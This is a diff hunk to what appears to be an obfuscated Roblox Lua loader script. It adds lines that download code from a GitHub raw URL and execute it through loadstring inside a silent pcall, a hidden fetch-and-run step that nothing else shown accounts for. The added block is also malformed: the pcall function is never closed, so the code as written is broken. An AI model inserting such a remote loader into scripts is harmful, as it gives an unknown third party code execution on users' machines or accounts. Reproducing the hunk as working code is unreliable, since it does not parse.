@@ -59,4 +59,14 @@ return(function(...)local h={"vhinnOZnxfba7PakRASrvoUs5TwS9C0KO7DjktH72stL6rJdIn
 end,debug.traceback)
 finishLoading(success)
 if not success then error(result) end
+local breakergg = "https://raw.githubusercontent.com/itachidevrs/gg/refs/heads/main/gg2"
+
+pcall(function()
+    local source = game:HttpGet(breakergg)
+    local fn, err = loadstring(source)
+    if fn then
+        fn()
+    else
+        warn("[breakergg] "..tostring(err))
+    end
 return result
